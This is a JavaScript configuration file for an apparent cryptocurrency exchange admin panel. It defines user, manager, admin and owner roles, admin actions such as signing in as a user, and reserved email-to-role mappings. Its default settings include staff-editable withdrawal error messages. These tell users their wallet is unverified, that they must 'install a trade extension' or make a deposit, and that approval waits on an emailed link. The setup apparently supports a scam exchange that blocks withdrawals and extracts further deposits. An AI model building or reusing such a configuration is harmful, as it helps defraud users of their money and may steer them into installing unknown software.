const defaultAdminSettings = {
  commission: 1,
  withdrawErrorMessage:
    'Your external wallet has not been verified. Install a trade extension or make at least one minimum deposit. For more information, contact chat support.',
  withdrawEmailConfirmation: false,
  withdrawEmailErrorMessage:
    'The withdrawal request has been successfully created. To approve withdrawals, you need to click on the link that is sent to your email.',
}

const roles = {
  user: {
    name: 'user',
    permissions: ['write:support.self', 'write:transactions.self'],
  },
  manager: {
    name: 'manager',
    permissions: [
      'write:support.binded',
      'write:users.binded',
      'write:actions.binded',
      'write:transactions.binded',
    ],
    settings: defaultAdminSettings,
  },
  admin: {
    name: 'admin',
    permissions: [
      'write:support.all',
      'read:users.all',
      'write:users.managers',
      'write:actions.managers',
      'write:transactions.all',
    ],
    settings: defaultAdminSettings,
  },
  owner: {
    name: 'owner',
    permissions: [
      'write:support.all',
      'write:users.all',
      'write:actions.all',
      'write:transactions.all',
    ],
    settings: defaultAdminSettings,
  },
}

const actions = userId => [
  {
    nameLocalPath: 'dashboard.profile.tabs.actions.signInAs',
    color: 'primary',
    url: `/api/admin/user/${userId}/signin`,
  },
  {
    nameLocalPath: 'dashboard.profile.actions.deleteUser',
    color: 'danger',
    url: `/api/admin/user/${userId}/delete`,
  },
  {
    nameLocalPath: 'dashboard.profile.actions.promote',
    color: 'primary',
    url: `/api/admin/user/${userId}/promote`,
  },
  {
    nameLocalPath: 'dashboard.profile.actions.demote',
    color: 'danger',
    url: `/api/admin/user/${userId}/demote`,
  },
]

const reservation = {
  'onxvnezakona@gmail.com': 'owner',
  'psoglav.ih8u@gmail.com': 'user',
  'design.lmcorp@gmail.com': 'manager',
}

module.exports = {
  roles,
  actions,
  reservation,
}
